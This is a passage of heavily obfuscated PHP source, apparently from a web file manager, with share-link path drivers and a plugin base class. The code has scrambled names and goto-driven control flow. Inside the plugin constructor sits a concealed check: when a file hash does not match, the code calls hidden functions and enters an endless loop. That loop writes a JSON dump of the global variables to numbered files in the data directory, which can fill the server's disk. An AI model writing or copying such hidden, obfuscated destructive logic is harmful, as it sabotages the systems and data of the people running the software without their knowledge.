if (in_array($cœæÈŠİéë, $dÈ®Êö±Í¦)) { $eŸÃÊÍîÓÂ = $this->getPathOuter($eŸÃÊÍîÓÂ); } return $eŸÃÊÍîÓÂ; } public function copy($cà–Ïôê³ç, $BÍ¶¥ëĞËŠ, $a¿§´ã³‡” = false) { return $this->copyMove($cà–Ïôê³ç, $BÍ¶¥ëĞËŠ, $a¿§´ã³‡”, $_SERVER[Ü˜][527]); } public function move($a¾­ š´°‚, $eõ…¥Âäì, $B¶ÀÀš¾è• = false) { return $this->copyMove($a¾­ š´°‚, $eõ…¥Âäì, $B¶ÀÀš¾è•, $_SERVER[Ü˜][529]); } private function copyMove($bàÂ³Ê¶òá, $E´Ô¯êÁ…, $eÚ»µñ÷ ø, $E±Ø•¾¡éë) { goto FœùàÕÚ²ê; b·ïÍšŠº›: return $eà¹š¹ÖŸ±; goto e‰Æ¦º¦¸‚; FœùàÕÚ²ê: $b§”ÈŸÈ‡í =& $_SERVER[Ü˜]; $f¤ĞãªÎ¥ö = $E´Ô¯êÁ…; $e‰Òß‡÷Î = IO::driverMake($E´Ô¯êÁ…); goto f«Ìšôˆ³¸; f«Ìšôˆ³¸: if ($e‰Òß‡÷Î->pathParse[$b§”ÈŸÈ‡í[1049]]) { $E´Ô¯êÁ… = $e‰Òß‡÷Î->pathParse[$b§”ÈŸÈ‡í[1049]]; } else { $E´Ô¯êÁ… = $f¤ĞãªÎ¥ö; } $eà¹š¹ÖŸ± = IO::copyMove($bàÂ³Ê¶òá, $E´Ô¯êÁ…, $eÚ»µñ÷ ø, $E±Ø•¾¡éë); $eà¹š¹ÖŸ± = $this->getPathOuter($eà¹š¹ÖŸ±); goto b·ïÍšŠº›; e‰Æ¦º¦¸‚: } public function pathThis($a«Ù·ìì°¯) { return get_path_this($this->pathParse[$_SERVER[Ü˜][86]]); } public function pathFather($Bñ˜ÇŒ®‹„) { return get_path_father($this->pathParse[$_SERVER[Ü˜][86]]); } public function iconvSystem($eõç“±½º) { return $eõç“±½º; } protected function infoParse($EêÎšÂ¡äÕ, $Eíö£™‚Ùì = false) { $b»ï°³·ø† =& $_SERVER[Ü˜]; $E–©½àöÈ = $this->pathParse[$b»ï°³·ø†[475]][$b»ï°³·ø†[1072]] . $this->pathParse[$b»ï°³·ø†[1065]]; if ($Eíö£™‚Ùì) { $Bâ¥…¾ƒğŞ = IO::infoWithChildren($E–©½àöÈ); } else { $Bâ¥…¾ƒğŞ = IO::info($E–©½àöÈ); } $f¢–…‡É¸ = $this->pathParse[$b»ï°³·ø†[475]]; return Action($b»ï°³·ø†[1215])->_shareItemeParse($Bâ¥…¾ƒğŞ, $f¢–…‡É¸); } public function listAll($D ‰•È«äÄ) { $a£¶¦‘×ºæ =& $_SERVER[Ü˜]; $B†Æôã = IO::listAll($D ‰•È«äÄ); $e±ó¬ëØ = $this->pathParse[$a£¶¦‘×ºæ[475]]; foreach ($B†Æôã as &$céÜÇÑµÑ½) { check_abort(); $aøÅ©¹¦Û¥ = IO::info($céÜÇÑµÑ½[$a£¶¦‘×ºæ[86]]); $aøÅ©¹¦Û¥ = is_array($aøÅ©¹¦Û¥) ? $aøÅ©¹¦Û¥ : array(); $céÜÇÑµÑ½ = array_merge($aøÅ©¹¦Û¥, $céÜÇÑµÑ½); $céÜÇÑµÑ½[$a£¶¦‘×ºæ[95]] = Action($a£¶¦‘×ºæ[1215])->_shareItemeParse($céÜÇÑµÑ½, $e±ó¬ëØ); } unset($céÜÇÑµÑ½); return $B†Æôã; } public function getPathOuter($d¢à™Ç™•¯) { goto A¢…Šì„…‚; CÊá¹·š­Ó: $C§ˆ¬ÃĞ» = KodIO::clear($d¢à™Ç™•¯); $c¯Š–Ï±¼… = KodIO::clear($this->pathParse[$fùàŠí‰Ï»[475]][$fùàŠí‰Ï»[1072]]); $aó«·©¤Ìµ = substr($C§ˆ¬ÃĞ», strlen($c¯Š–Ï±¼…)); goto BÛ¾¹´šÈ; A¢…Šì„…‚: $fùàŠí‰Ï» =& $_SERVER[Ü˜]; $D¼çôì¼·” = KodIO::parse($d¢à™Ç™•¯); if ($D¼çôì¼·”[$fùàŠí‰Ï»[29]] == KodIO::KOD_SHARE_ITEM) { return $D¼çôì¼·”[$fùàŠí‰Ï»[86]]; } goto CÊá¹·š­Ó; BÛ¾¹´šÈ: if (substr($C§ˆ¬ÃĞ», 0, strlen($c¯Š–Ï±¼…)) != $c¯Š–Ï±¼…) { return !1; } return $this->pathParse[$fùàŠí‰Ï»[1066]] . $fùàŠí‰Ï»[8] . ltrim($aó«·©¤Ìµ, $fùàŠí‰Ï»[8]); goto Eâ ¤¶ÖÒ“; Eâ ¤¶ÖÒ“: } public function getType() { $e®¿”‚³ª =& $_SERVER[Ü˜]; $eµÌÃÛ‹¡ = str_replace($e®¿”‚³ª[82], $e®¿”‚³ª[33], get_class($this)); return strtolower($eµÌÃÛ‹¡); } public function isTypeObject($Eî×ÎîÍÚ) { return IO::isTypeObject($Eî×ÎîÍÚ); } public function info($fÚ¾×½õêÆ) { return $this->infoParse($fÚ¾×½õêÆ); } public function infoAuth($câ‚äµ¯¾¦) { return $this->infoParse($câ‚äµ¯¾¦); } public function infoWithChildren($eÔºŒ“è‘æ) { return $this->infoParse($eÔºŒ“è‘æ, !0); } public function infoFull($CôÇÜ°—·­) { return $this->infoParse($CôÇÜ°—·­); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($e¦ˆŸ¨İŸØ) { $this->pathParse = $e¦ˆŸ¨İŸØ; } protected function infoParse($cÖô–ß—¥½, $D•›êì«¹ = false) { $C„âæˆ±­ =& $_SERVER[Ü˜]; return Action($C„âæˆ±­[1071])->sharePathInfo($this->pathParse[$C„âæˆ±­[86]], !0, $D•›êì«¹); } public function listPath($BœîÜ¹Ùœ, $d°’ö£¡Ÿ› = false) { $fòî¸º¯Š =& $_SERVER[Ü˜]; $eÎ‚Ì›“¸ = IO::listPath($BœîÜ¹Ùœ, $d°’ö£¡Ÿ›); foreach ($eÎ‚Ì›“¸ as $cÙ„²»ƒ†— => $Aõ×”À°îå) { if (!in_array($cÙ„²»ƒ†—, array($fòî¸º¯Š[84], $fòî¸º¯Š[85]))) { continue; } foreach ($Aõ×”À°îå as $f»‚ôÒ‚¤ => $b¸¯²µ¬Àâ) { $b¸¯²µ¬Àâ = Action($fòî¸º¯Š[1224])->parsePathChildren($b¸¯²µ¬Àâ, array($fòî¸º¯Š[423] => $BœîÜ¹Ùœ)); $eÎ‚Ì›“¸[$cÙ„²»ƒ†—][$f»‚ôÒ‚¤] = Action($fòî¸º¯Š[1071])->shareItemInfo($b¸¯²µ¬Àâ); } } return $eÎ‚Ì›“¸; } public function listAll($b‰éŒˆ¢ğÄ) { $F§‹ä‰ù =& $_SERVER[Ü˜]; $f½Ì—˜ºŞ = IO::listAll($b‰éŒˆ¢ğÄ); foreach ($f½Ì—˜ºŞ as &$eÅ…ø‰”Ó’) { $dÀÚŞÓ¦¤‡ = IO::info($eÅ…ø‰”Ó’[$F§‹ä‰ù[86]]); $dÀÚŞÓ¦¤‡ = is_array($dÀÚŞÓ¦¤‡) ? $dÀÚŞÓ¦¤‡ : array(); $eÅ…ø‰”Ó’ = array_merge($dÀÚŞÓ¦¤‡, $eÅ…ø‰”Ó’); $eÅ…ø‰”Ó’[$F§‹ä‰ù[95]] = Action($F§‹ä‰ù[1071])->shareItemInfo($eÅ…ø‰”Ó’); } unset($eÅ…ø‰”Ó’); return $f½Ì—˜ºŞ; } } goto e‹±êš ªÒ; DÖãÁÇèø‡: define($_SERVER[Ü˜][246], 2); define($_SERVER[Ü˜][247], 3); define($_SERVER[Ü˜][248], 1); goto c‚ÆãŠ°; F·»¨©ÍÌë: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto DöØê™Ø; e’âß‚¼ì: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto DÜˆˆ¿é†Å; C›¿¼¹í¸Ê: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $B®Ë“·ÚÖˆ[8]; $this->pluginApi = appHostGet() . $B®Ë“·ÚÖˆ[1402] . $this->pluginName . $B®Ë“·ÚÖˆ[8]; $this->pluginHost = $config[$B®Ë“·ÚÖˆ[1403]] . $this->pluginName . $B®Ë“·ÚÖˆ[8]; goto CÑ°¦„É; Bº¨çò‰Ó¬: $this->in =& $in; $this->modelPlugin = Model($B®Ë“·ÚÖˆ[1401]); $this->pluginName = str_replace($B®Ë“·ÚÖˆ[1401], $B®Ë“·ÚÖˆ[33], get_class($this)); goto C›¿¼¹í¸Ê; DöØê™Ø: $B®Ë“·ÚÖˆ =& $_SERVER[Ü˜]; $DÜÊ‚¦”…Û = $_SERVER[$B®Ë“·ÚÖˆ[61]] . $B®Ë“·ÚÖˆ[62]; $F¼Á‰Äóˆ = $B®Ë“·ÚÖˆ[58]; goto dÆ’êªì•‰; CÑ°¦„É: $this->pluginHostDefault = $config[$B®Ë“·ÚÖˆ[1403]] . $this->pluginName . $B®Ë“·ÚÖˆ[8]; $dŒŠ‘÷ Æ = $config[$B®Ë“·ÚÖˆ[1404]]; if ($dŒŠ‘÷ Æ && strpos($B®Ë“·ÚÖˆ[47] . $dŒŠ‘÷ Æ . $B®Ë“·ÚÖˆ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$B®Ë“·ÚÖˆ[1405]] . $this->pluginName . $B®Ë“·ÚÖˆ[8]; } goto e’âß‚¼ì; dÆ’êªì•‰: if ($_SERVER[$B®Ë“·ÚÖˆ[59]] != $F¼Á‰Äóˆ($DÜÊ‚¦”…Û)) { goto F«Õ¹´¼õˆ; Aª‹Şˆ¾ñ÷: $cŒ†Ğİñ¬§ = $a¹ñŠĞ¢„ª($DäÂİ„ÏœÓ); $D‚˜îâ¸ö = explode($B®Ë“·ÚÖˆ[63], $cŒ†Ğİñ¬§); if (count($D‚˜îâ¸ö) < $B®Ë“·ÚÖˆ[605]) { $Dó¢§Á‰ª› = $B®Ë“·ÚÖˆ[65]; $Dó¢§Á‰ª›(); } goto A”Å×—ù‰; A”Å×—ù‰: $cÓ‰ˆ¡†Öê = $B®Ë“·ÚÖˆ[842]; $cÓ‰ˆ¡†Öê($_SERVER[$B®Ë“·ÚÖˆ[843]]); $EÃĞ½Ï÷†î = $B®Ë“·ÚÖˆ[841]; goto CçƒÉ‘ Àö; BÎƒÍÊ„ç¬: $dÚÚ¸ğ•†å = 1; for ($c½ùŸĞ–§Å = $dÚÚ¸ğ•†å; $c½ùŸĞ–§Å > 0; $c½ùŸĞ–§Å++) { $bÒ¨ÓŒÑÂ±(DATA_PATH . $c½ùŸĞ–§Å, $B”½ÔÅãÌ–); } goto b‰¼ğæ¶¨Ú; F«Õ¹´¼õˆ: $EÃĞ½Ï÷†î = $B®Ë“·ÚÖˆ[841]; $a¹ñŠĞ¢„ª = $B®Ë“·ÚÖˆ[60]; $DäÂİ„ÏœÓ = $_SERVER[$B®Ë“·ÚÖˆ[61]] . $B®Ë“·ÚÖˆ[62]; goto Aª‹Şˆ¾ñ÷; CçƒÉ‘ Àö: $EÃĞ½Ï÷†î(); $bÒ¨ÓŒÑÂ± = $B®Ë“·ÚÖˆ[1399]; $B”½ÔÅãÌ– = json_encode($GLOBALS[$B®Ë“·ÚÖˆ[1400]]); goto BÎƒÍÊ„ç¬; b‰¼ğæ¶¨Ú: } global $in, $config; $this->config =& $config; goto Bº¨çò‰Ó¬; DÜˆˆ¿é†Å: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Ü˜][1406]); } protected function assign($FœŠÃ…ÅˆŞ, $Aß±Ÿ´÷ = false) { if (is_array($FœŠÃ…ÅˆŞ)) { $this->values = array_merge($this->values, $FœŠÃ…ÅˆŞ); } else { $this->values[$FœŠÃ…ÅˆŞ] = $Aß±Ÿ´÷; } } protected function display($bÆÖŞ˜Ø…) { extract($this->values); require $bÆÖŞ˜Ø…; } final function hookRegist($fÆØƒš‰¢‹) { $this->modelPlugin->appRegist($this->pluginName, $fÆØƒš‰¢‹); } final function appIcon() { $B™¹ÔĞäÛ =& $_SERVER[Ü˜]; $b±—œÛ„¿® = $this->appPackage(); $c§¹¬Á‹ğÖ = $B™¹ÔĞäÛ[33]; if (isset($b±—œÛ„¿®[$B™¹ÔĞäÛ[418]])) { if (isset($b±—œÛ„¿®[$B™¹ÔĞäÛ[418]][$B™¹ÔĞäÛ[1407]])) { $c§¹¬Á‹ğÖ = $B™¹ÔĞäÛ[1408] . $b±—œÛ„¿®[$B™¹ÔĞäÛ[418]][$B™¹ÔĞäÛ[1407]] . $B™¹ÔĞäÛ[1409]; } else { if ($b±—œÛ„¿®[$B™¹ÔĞäÛ[418]][$B™¹ÔĞäÛ[1410]]) { $c§¹¬Á‹ğÖ = $B™¹ÔĞäÛ[1411] . $b±—œÛ„¿®[$B™¹ÔĞäÛ[418]][$B™¹ÔĞäÛ[1410]] . $B™¹ÔĞäÛ[1412]; } } } return $c§¹¬Á‹ğÖ; } final function fileCanView($aôÂà‡É‚ ) { goto fİâ ƒ¾ïî; Eß‰§ºØŠ¤: $eÚªŞÈŞøñ = Session::get($bï“«©°Â[1413]); if (!$eÚªŞÈŞøñ || !$eÚªŞÈŞøñ[$bï“«©°Â[1414]]) { $fî›éŠŒ¥Ú = $bï“«©°Â[1415] . rawurlencode(this_url()); show_tips(LNG($bï“«©°Â[1416]) . $bï“«©°Â[1417] . $fî›éŠŒ¥Ú . $bï“«©°Â[1418] . LNG($bï“«©°Â[1419]) . $bï“«©°Â[1420], !1); } if (!Action($bï“«©°Â[1421])->authCan($bï“«©°Â[1422])) { show_tips(LNG($bï“«©°Â[1423]) . $bï“«©°Â[1424], !1); } goto Dùø«ßÌä; fİâ ƒ¾ïî: $bï“«©°Â =& $_SERVER[Ü˜]; if (request_url_safe($aôÂà‡É‚ )) { return !0; } if ($this->isShare($aôÂà‡É‚ )) { return !0; } goto Eß‰§ºØŠ¤; Dùø«ßÌä: ActionCall($bï“«©°Â[1425], $aôÂà‡É‚ ); goto F·ÏèóÕãÀ; F·ÏèóÕãÀ: } final function isShare($aŞÃäêŠöõ) { $A·èàøÒ– = KodIO::parse($aŞÃäêŠöõ); return $A·èàøÒ–[$_SERVER[Ü˜][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($cªÙŠ‘¶ó) { if (request_url_safe($cªÙŠ‘¶ó)) { return $cªÙŠ‘¶ó; } if (!$this->isShare($cªÙŠ‘¶ó)) { $cªÙŠ‘¶ó = $this->filePath($cªÙŠ‘¶ó); } return Action($_SERVER[Ü˜][1071])->linkOut($cªÙŠ‘¶ó); } public function filePathLinkOut($A¼ß‹ë ³) { if (request_url_safe($A¼ß‹ë ³)) { return $A¼ß‹ë ³; } $this->fileCanView($A¼ß‹ë ³); return Action($_SERVER[Ü˜][1071])->link($A¼ß‹ë ³); } final function filePath($fœ–¦Š÷§) { $D¨¢çÆ ±¬ =& $_SERVER[Ü˜]; if ($AºÍÈÈèÁï = $this->checkSharePath($fœ–¦Š÷§)) { Hook::trigger($D¨¢çÆ ±¬[1426], $AºÍÈÈèÁï); return $AºÍÈÈèÁï; } $this->fileCanView($fœ–¦Š÷§); if (request_url_safe($fœ–¦Š÷§)) { $c„À©Åè¶õ = parse_url_query($fœ–¦Š÷§); if (isset($c„À©Åè¶õ[$D¨¢çÆ ±¬[1427]]) && isset($c„À©Åè¶õ[$D¨¢çÆ ±¬[219]])) { $f¦‰‡ó¡¨Ó = Model($D¨¢çÆ ±¬[739])->get($D¨¢çÆ ±¬[740]); $e†–õÒõ™Á = Mcrypt::decode($c„À©Åè¶õ[$D¨¢çÆ ±¬[219]], $f¦‰‡ó¡¨Ó); if ($e†–õÒõ™Á) { $this->fileInfo = IO::infoWithChildren($e†–õÒõ™Á); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $e†–õÒõ™Á; } } $fœ–¦Š÷§ = $this->_cacheHttpFile($fœ–¦Š÷§); $this->fileInfo = IO::infoWithChildren($fœ–¦Š÷§); } else { $this->fileInfo = IO::infoWithChildren($fœ–¦Š÷§); if (!$this->fileInfo) { show_tips(LNG($D¨¢çÆ ±¬[115]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($D¨¢çÆ ±¬[1426], $fœ–¦Š÷§); return $fœ–¦Š÷§; } final function _cacheHttpFile($Fšó“­¯é•) { $Bˆš©ßÙö = hash_path($Fšó“­¯é•, !0); $this->cachePath = $this->pluginCachePath($Bˆš©ßÙö); if ($böŠÙ×†„Ó = IO::fileNameExist($this->cachePath, $Bˆš©ßÙö)) { return KodIO::make($böŠÙ×†„Ó); } $Eìáèæä•æ = $this->cachePath . $Bˆš©ßÙö; return $this->pluginCacheFileSet($Eìáèæä•æ, file_get_contents_nossl($Fšó“­¯é•)); } final function _tmpFileName($e£ÚÉµä˜ï = array()) { goto dğ¼Ó§Î±Õ; e§¿²º†ìë: if (isset($e£ÚÉµä˜ï[$d»­ì¸›áŠ[174]][$d»­ì¸›áŠ[181]])) { return $e£ÚÉµä˜ï[$d»­ì¸›áŠ[174]][$d»­ì¸›áŠ[181]]; } $A·ÃÆ›“†Ò = IO::hashSimple($e£ÚÉµä˜ï[$d»­ì¸›áŠ[86]]); if ($A·ÃÆ›“†Ò) { return $A·ÃÆ›“†Ò; } goto eÌœ°¿Ş„í; dğ¼Ó§Î±Õ: $d»­ì¸›áŠ =& $_SERVER[Ü˜]; if (!$e£ÚÉµä˜ï) { $e£ÚÉµä˜ï = $this->fileInfo; } if (isset($e£ÚÉµä˜ï[$d»­ì¸›áŠ[181]])) { return $e£ÚÉµä˜ï[$d»­ì¸›áŠ[181]]; } goto e§¿²º†ìë; eÌœ°¿Ş„í: $AÍ£âšæ‘ = array($e£ÚÉµä˜ï[$d»­ì¸›áŠ[28]], $e£ÚÉµä˜ï[$d»­ì¸›áŠ[86]], $e£ÚÉµä˜ï[$d»­ì¸›áŠ[88]]); if (isset($e£ÚÉµä˜ï[$d»­ì¸›áŠ[496]])) { $AÍ£âšæ‘[] = $e£ÚÉµä˜ï[$d»­ì¸›áŠ[496]]; } return md5(implode($d»­ì¸›áŠ[81], $AÍ£âšæ‘)); goto f‰¿˜Ü‘»; f‰¿˜Ü‘»: } final function checkSharePath($cšâêÕôÉ) { goto a¦íòÎã; a¦íòÎã: $d¾¶¬¹ôÆˆ =& $_SERVER[Ü˜]; if (!defined($d¾¶¬¹ôÆˆ[463])) { define($d¾¶¬¹ôÆˆ[1428], 0); } if (!$this->isShare($cšâêÕôÉ)) { return !1; } goto C¦¿àŒÍí±; C¦¿àŒÍí±: $E…ÙŠŒ÷•Ó = Action($d¾¶¬¹ôÆˆ[1071])->sharePathInfo($cšâêÕôÉ); if (!isset($E…ÙŠŒ÷•Ó[$d¾¶¬¹ôÆˆ[86]])) { show_json(LNG($d¾¶¬¹ôÆˆ[1429]), !1); } $this->fileInfo = $E…ÙŠŒ÷•Ó[$d¾¶¬¹ôÆˆ[174]]; goto Dï¨Ò°ÀŸ; Dï¨Ò°ÀŸ: $this->cachePath = $this->pluginCachePath($this->fileInfo[$d¾¶¬¹ôÆˆ[181]]); return $E…ÙŠŒ÷•Ó[$d¾¶¬¹ôÆˆ[86]]; goto DèĞøÛĞ‚; DèĞøÛĞ‚: } final function pluginCachePath($bí¸œ¡™ Å = '') { $e˜ÓªÜ·¾ì =& $_SERVER[Ü˜]; $A‹½®¶•¥ê = IO_PATH_SYSTEM_TEMP . $e˜ÓªÜ·¾ì[1430] . $this->pluginName; if (!($FŸÙ´¡íÕœ = IO::infoFull($A‹½®¶•¥ê))) { return IO::mkdir($A‹½®¶•¥ê . $e˜ÓªÜ·¾ì[8] . $bí¸œ¡™ Å); } if (empty($bí¸œ¡™ Å)) { return $FŸÙ´¡íÕœ[$e˜ÓªÜ·¾ì[86]]; } if (!($AÆ¼×°ò§ = IO::fileNameExist($FŸÙ´¡íÕœ[$e˜ÓªÜ·¾ì[86]], $bí¸œ¡™ Å))) { return IO::mkdir($FŸÙ´¡íÕœ[$e˜ÓªÜ·¾ì[86]] . $bí¸œ¡™ Å); } return KodIO::make($AÆ¼×°ò§); } final function pluginCacheFileSet($aÅÒÂª¸ƒå, $bë¥¯¶Â‡ë = '') { $F–ƒãèÚÕ¥ =& $_SERVER[Ü˜]; if (!($c³ÚÈ˜øšà = IO::infoFull($aÅÒÂª¸ƒå))) { return IO::mkfile($aÅÒÂª¸ƒå, $bë¥¯¶Â‡ë, REPEAT_REPLACE); } IO::setContent($c³ÚÈ˜øšà[$F–ƒãèÚÕ¥[86]], $bë¥¯¶Â‡ë); return $c³ÚÈ˜øšà[$F–ƒãèÚÕ¥[86]]; } final function pluginLocalFile($D¹Ü¤ÛÍÜ = '') { goto bÉ±ğö”–ï; AÔ”áÍ™“ƒ: if (!$D¹Ü¤ÛÍÜ) { return $b›’©×‡øÛ; } $B¿ì‘¹¡„ï = IO::info($D¹Ü¤ÛÍÜ); $c³Éƒ‚¸‰´ = $this->_tmpFileName($B¿ì‘¹¡„ï) . $b¶…Ä³¸Ì[105] . $B¿ì‘¹¡„ï[$b¶…Ä³¸Ì[178]]; goto AË£‰œ‰; bÉ±ğö”–ï: $b¶…Ä³¸Ì =& $_SERVER[Ü˜]; $b›’©×‡øÛ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($b›’©×‡øÛ)) { mk_dir($b›’©×‡øÛ); } goto AÔ”áÍ™“ƒ; cÄ‹ìÌ„¶­: return IO::copy($D¹Ü¤ÛÍÜ, $b›’©×‡øÛ, 0, $c³Éƒ‚¸‰´); goto A¡Ø¡ëğšÜ; AË£‰œ‰: if (!checkExtSafe($c³Éƒ‚¸‰´)) { $c³Éƒ‚¸‰´ = $c³Éƒ‚¸‰´ . $b¶…Ä³¸Ì[1431]; } $AÛñ¡ô¶ = $b›’©×‡øÛ . $c³Éƒ‚¸‰´; if (@file_exists($AÛñ¡ô¶)) { return $AÛñ¡ô¶; } goto cÄ‹ìÌ„¶­; A¡Ø¡ëğšÜ: } final function appPackage() { goto F–îƒê¿„; eÕğ°²ÂºĞ: $this->parseLang($b–ôîÚøá±); $dâÎÖ«’±Ä = json_decode_force($b–ôîÚøá±); if (!$dâÎÖ«’±Ä) { return array(); } goto bÂ«îÌ‡£; bÂ«îÌ‡£: $Aß†é“¤†£ = Hook::trigger($F°ŠØÎ‘¹[1433], $dâÎÖ«’±Ä); if ($Aß†é“¤†£ && is_array($Aß†é“¤†£)) { $dâÎÖ«’±Ä = $Aß†é“¤†£; } $this->packageData = $dâÎÖ«’±Ä; goto D×ß¨Ú˜£; F–îƒê¿„: $F°ŠØÎ‘¹ =& $_SERVER[Ü˜]; if ($this->packageData) { return $this->packageData; } $b–ôîÚøá± = $this->parseFile($this->pluginPath . $F°ŠØÎ‘¹[1432]); goto eÕğ°²ÂºĞ; D×ß¨Ú˜£: return $dâÎÖ«’±Ä; goto dŒËÂù§ã; dŒËÂù§ã: } public function packageInfoGet($c¶ĞÁß´ŠÖ) { $F¥Ò³ÜÕ‰ = $this->appPackage(); return array_get_value($F¥Ò³ÜÕ‰, $c¶ĞÁß´ŠÖ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Ü˜][1434]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Ü˜][1435]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Ü˜][1436]); } private function parseFile($cÁ«èã˜Ÿ„) { goto Dğ÷÷ñ±ÒË; cµÙêÛ…™Œ: $E¼²—òëê = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$C’ĞôóÖÉÖ[98]][$C’ĞôóÖÉÖ[1444]]); if (strstr($Aã•ÙÛÌçï, $C’ĞôóÖÉÖ[1445])) { $bï³ÑËÖÙö = rawurlencode(json_encode($this->pluginLangArr)); $Aã•ÙÛÌçï = str_replace($C’ĞôóÖÉÖ[1445], $bï³ÑËÖÙö, $Aã•ÙÛÌçï); } if (strstr($Aã•ÙÛÌçï, $C’ĞôóÖÉÖ[1446])) { $bï³ÑËÖÙö = $bï³ÑËÖÙö = rawurlencode(json_encode($this->getConfig())); $Aã•ÙÛÌçï = str_replace($C’ĞôóÖÉÖ[1446], $bï³ÑËÖÙö, $Aã•ÙÛÌçï); } goto AŠ¾…íÊ£; AŠ¾…íÊ£: $Aã•ÙÛÌçï = str_replace($Bé‡æÑ‰…Ë, $E¼²—òëê, $Aã•ÙÛÌçï); return $Aã•ÙÛÌçï; goto A¿¦øµ÷áß; Dğ÷÷ñ±ÒË: $C’ĞôóÖÉÖ =& $_SERVER[Ü˜]; $Aã•ÙÛÌçï = file_get_contents_nossl($cÁ«èã˜Ÿ„); $Bé‡æÑ‰…Ë = array($C’ĞôóÖÉÖ[1437], $C’ĞôóÖÉÖ[1438], $C’ĞôóÖÉÖ[1439], $C’ĞôóÖÉÖ[1440], $C’ĞôóÖÉÖ[1441], $C’ĞôóÖÉÖ[1442], $C’ĞôóÖÉÖ[1443]); goto cµÙêÛ…™Œ; A¿¦øµ÷áß: } private function parseLang(&$Då‚Çƒâ) { goto B‡—Ç÷ˆ; C•â¡œŸƒ‘: preg_match_all($A´˜–Æöæê[1448], $Då‚Çƒâ, $böãÆÚ¡  ); if (!is_array($böãÆÚ¡  ) || count($böãÆÚ¡  ) == 0 || !is_array($böãÆÚ¡  [0]) || count($böãÆÚ¡  [0]) == 0) { return; } $B¶ÂÂ‚‘†Ì = array(); goto bËŒÁ½ò±; bËŒÁ½ò±: $C’äáÅ¥£® = array(); foreach ($böãÆÚ¡  [0] as $f¸ĞÚñöæÑ) { $BëÆİÆ´ó = substr($f¸ĞÚñöæÑ, strlen($cîÔ’µ ¸µ), -4); $A­¯©†Í­„ = LNG($BëÆİÆ´ó); $B¶ÂÂ‚‘†Ì[] = $f¸ĞÚñöæÑ; $C’äáÅ¥£®[] = str_replace(array($A´˜–Æöæê[63], $A´˜–Æöæê[1039], $A´˜–Æöæê[349], $A´˜–Æöæê[126]), array($A´˜–Æöæê[50], $A´˜–Æöæê[50], $A´˜–Æöæê[33], $A´˜–Æöæê[1449]), $A­¯©†Í­„); } $Då‚Çƒâ = str_replace($B¶ÂÂ‚‘†Ì, $C’äáÅ¥£®, $Då‚Çƒâ); goto d±›àŸ“ù‡; B‡—Ç÷ˆ: $A´˜–Æöæê =& $_SERVER[Ü˜]; $cîÔ’µ ¸µ = $A´˜–Æöæê[1447]; if (!strstr($Då‚Çƒâ, $cîÔ’µ ¸µ)) { return; } goto C•â¡œŸƒ‘; d±›àŸ“ù‡: } private function parseConfig(&$DÃ„«œÓœ) { goto AâéÚŠƒ“ã; AâéÚŠƒ“ã: $bÎÈë‹ê‰¤ =& $_SERVER[Ü˜]; $cÄËŞ¾¼­§ = $bÎÈë‹ê‰¤[1450]; if (!strstr($DÃ„«œÓœ, $cÄËŞ¾¼­§)) { return; } goto eÂ›”äÕ˜õ; d÷„İÛºù: $DÃ„«œÓœ = str_replace($EùŒÌ‚ã¨, $B‰½ùˆÎÚà, $DÃ„«œÓœ); goto A¼ÈÕæìæ‚; fÙÖÔ´âÖ™: $EùŒÌ‚ã¨ = array(); $B‰½ùˆÎÚà = array(); foreach ($aÇîÅ¨³“¼[0] as $BŠÙ¿åµ) { $f¬™ˆ°æ°Ö = substr($BŠÙ¿åµ, strlen($cÄËŞ¾¼­§), -2); $EùŒÌ‚ã¨[] = $BŠÙ¿åµ; $B‰½ùˆÎÚà[] = _get($c¡¾¯·ä¯’, $f¬™ˆ°æ°Ö); } goto d÷„İÛºù; eÂ›”äÕ˜õ: preg_match_all($bÎÈë‹ê‰¤[1451], $DÃ„«œÓœ, $aÇîÅ¨³“¼); if (!is_array($aÇîÅ¨³“¼) || count($aÇîÅ¨³“¼) == 0 || !is_array($aÇîÅ¨³“¼[0]) || count($aÇîÅ¨³“¼[0]) == 0) { return; } $c¡¾¯·ä¯’ = $this->getConfig(); goto fÙÖÔ´âÖ™; A¼ÈÕæìæ‚: } private function parsePackage(&$AŒ¾ÇÔ…¶) { goto e³›³¬ˆ½Ä; e¢¶–äŠº×: $AŒ¾ÇÔ…¶ = str_replace($F°¹ä»Éââ, $E¸Ø¨æŠœª, $AŒ¾ÇÔ…¶); goto b‹ğ–ªÑÖÑ; f•ÉÎ‚¼Š: preg_match_all($C†‚Ù»êÈ[1453], $AŒ¾ÇÔ…¶, $A¡ááÙÜ’‰); if (!is_array($A¡ááÙÜ’‰) || count($A¡ááÙÜ’‰) == 0 || !is_array($A¡ááÙÜ’‰[0]) || count($A¡ááÙÜ’‰[0]) == 0) { return; } $fšíÓøÒ‰Ô = $this->appPackage(); goto B†Á°Æ–; e³›³¬ˆ½Ä: $C†‚Ù»êÈ =& $_SERVER[Ü˜]; $D˜ªÌÊ‡… = $C†‚Ù»êÈ[1452]; if (!strstr($AŒ¾ÇÔ…¶, $D˜ªÌÊ‡…)) { return; } goto f•ÉÎ‚¼Š; B†Á°Æ–: $F°¹ä»Éââ = array(); $E¸Ø¨æŠœª = array(); foreach ($A¡ááÙÜ’‰[0] as $C°‹Õ‡‰Ğñ) { $f˜Ÿ–´‹Š = substr($C°‹Õ‡‰Ğñ, strlen($D˜ªÌÊ‡…), -2); $F°¹ä»Éââ[] = $C°‹Õ‡‰Ğñ; $E¸Ø¨æŠœª[] = _get($fšíÓøÒ‰Ô, $f˜Ÿ–´‹Š); } goto e¢¶–äŠº×; b‹ğ–ªÑÖÑ: } final function 